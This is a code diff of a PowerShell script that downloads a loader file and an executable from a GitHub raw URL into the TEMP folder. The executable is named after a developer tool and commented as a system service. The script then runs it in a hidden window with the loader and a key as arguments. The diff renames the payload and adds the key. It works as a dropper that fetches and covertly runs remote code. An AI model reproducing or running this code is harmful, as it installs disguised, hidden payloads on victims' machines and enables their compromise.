@@ -17,14 +17,14 @@ try {
     Invoke-WebRequest -Uri $loaderUrl -OutFile $loaderPath
 
     # Download smsvchost.exe
-    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/vscode.exe"
-    $smsvchostPath = "$env:TEMP\vscode.exe"
+    $smsvchostUrl = "https://github.com/a86782627/72628768/raw/refs/heads/master/xcode.exe"
+    $smsvchostPath = "$env:TEMP\xcode.exe"
     Invoke-WebRequest -Uri $smsvchostUrl -OutFile $smsvchostPath
 
     # Run smsvchost.exe with loader.bin as an argument in the background
     $processInfo = New-Object System.Diagnostics.ProcessStartInfo
     $processInfo.FileName = $smsvchostPath
-    $processInfo.Arguments = "`"$loaderPath`""
+    $processInfo.Arguments = "`"$loaderPath`" supersecretkey"
     $processInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden  # Run invisibly
     $processInfo.UseShellExecute = $false  # Required for hidden window
     $processInfo.RedirectStandardInput = $true  # Redirect standard input to send keys
